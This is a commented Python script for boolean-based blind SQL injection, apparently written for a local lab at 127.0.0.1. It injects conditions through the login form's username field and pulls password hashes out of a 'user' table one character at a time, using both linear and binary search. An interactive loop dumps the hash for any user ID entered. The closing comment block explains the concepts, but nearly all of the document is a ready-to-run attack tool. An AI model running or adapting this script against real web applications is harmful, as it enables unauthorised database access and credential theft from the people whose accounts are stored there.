# This is a blind SQL injection script that extracts password hashes from a vulnerable web application
# It uses boolean-based injection techniques to infer information character by character

import requests

# Counter to track the number of queries made to the target
total_queries = 0
# Character set that might be used in the password hash (hexadecimal characters)
charset = "0123456789abcdef"
# Target URL of the vulnerable application
target = "http://127.0.0.1:5000"
# String that appears in the response when the SQL condition is TRUE
needle = "Welcome Back"


def injected_query(payload):
    """Execute a SQL injection query and return whether the needle is NOT in the response."""
    global total_queries
    # Craft the injection in the username parameter. The payload is embedded in a SQL conditional.
    r = requests.post(
        target, data={"username": "admin' and {payload}--", "password": "password"})
    total_queries += 1  # Increment query counter
    # If needle is NOT in response, the SQL condition evaluated to TRUE
    return needle.encode() not in r.content


def boolean_query(offset, user_id, character, operator=">"):
    """Construct a boolean query to compare a character at a specific position."""
    # Payload compares hex value of character at position 'offset' in password
    # with hex value of provided character using the specified operator
    payload = f"(select hex(substr(password, {offset+1}, 1)) from user where id = {user_id}) {operator} hex('{character}')"
    return injected_query(payload)


def invalid_user(user_id):
    """Check if a user with the given ID exists in the database."""
    payload = f"(select id from user where id = {user_id})"
    # Returns True if user doesn't exist (needle not in response)
    return injected_query(payload)


def password_length(user_id):
    """Determine the length of the password for a given user ID."""
    i = 0
    while True:
        # Check if password length is less than or equal to i
        payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
        # When injected_query returns False, it means length(password) <= i is TRUE
        if not injected_query(payload):
            return i  # Found the exact length
        i += 1


def extract_hash(charset, user_id, password_length):
    """Extract password hash using linear search through character set."""
    found = ""
    # Iterate through each character position in the password
    for i in range(0, password_length):
        # Try each possible character in the charset
        for j in range(len(charset)):
            # Check if character at position i > charset[j]
            # When this returns True, we've found a character that's greater than all previous
            # but less than or equal to the current one
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found


def extract_hash_bst(charset, user_id, password_length):
    """Extract password hash using binary search for more efficient character discovery."""
    found = ""
    # For each character position in the password
    for index in range(0, password_length):
        start = 0
        end = len(charset) - 1
        # Perform binary search on the character set
        while start <= end:
            # When only two characters remain
            if end - start == 1:
                # Special case for start of charset
                if start == 0 and boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[start + 1]
                break
            else:
                middle = (start + end) // 2
                # Check if character > charset[middle]
                if boolean_query(index, user_id, charset[middle]):
                    # Character is in lower half
                    end = middle
                else:
                    # Character is in upper half
                    start = middle
    return found


def total_queries_taken():
    """Print and reset the total queries counter."""
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0


# Main interactive loop
while True:
    try:
        # Get user ID from input
        user_id = input("> Enter a User ID to extract the password hash: ")
        # Check if user exists
        if not invalid_user(user_id):
            # Get password length
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            total_queries_taken()

            # Extract hash using linear search
            print(
                f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
            total_queries_taken()

            # Extract hash using binary search (more efficient)
            print(
                f"\t[-] User {user_id} hash: {extract_hash_bst(charset, user_id, user_password_length)}")
            total_queries_taken()
        else:
            print(f"[X] User {user_id} does not exist!")
    except KeyboardInterrupt:
        # Exit on Ctrl+C
        break

# KEY CONCEPTS:
# 1. Blind SQL Injection - No direct output, only infer information from boolean responses
# 2. Boolean-based injection - Uses conditional statements to extract data bit by bit
# 3. Hex comparison - Compares hexadecimal values to avoid issues with character encoding
# 4. Two search methods:
#    - Linear search: O(n) per character, simple but slower
#    - Binary search: O(log n) per character, more efficient
# 5. The injection works by appending to the username: admin' AND (SQL_CONDITION)--
# 6. The 'needle' string determines if the SQL condition evaluated to TRUE
